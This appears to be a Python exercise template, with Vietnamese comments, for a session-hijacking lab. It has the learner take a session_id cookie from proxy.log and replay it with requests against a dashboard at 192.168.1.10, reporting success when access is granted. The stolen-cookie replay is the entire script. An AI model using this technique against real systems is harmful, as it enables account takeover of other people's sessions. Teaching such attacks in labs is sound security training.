import requests

# Yêu cầu:
# 1. Đọc file proxy.log và tìm giá trị của session_id cookie.
# 2. Sử dụng thư viện requests gửi GET request tới Web Server kèm cookie đó.

url = "http://192.168.1.10/dashboard"

# TODO: Trích xuất cookie từ file proxy.log (Điền thủ công hoặc viết code đọc file)
stolen_cookie = "ĐIỀN_COOKIE_VÀO_ĐÂY" 

# Thiết lập cookie cho request
cookies = {'session_id': stolen_cookie}

try:
    print(f"Sending request to {url} with cookie: {stolen_cookie}")
    response = requests.get(url, cookies=cookies)
    
    # Kịch bản kiểm tra
    if response.status_code == 200 and "Welcome" in response.text:
        print("Session Hijacked Successfully")
    else:
        print(f"Failed! Status Code: {response.status_code}")
        print(f"Response: {response.text}")
except Exception as e:
    print(f"Error connecting to server: {e}")
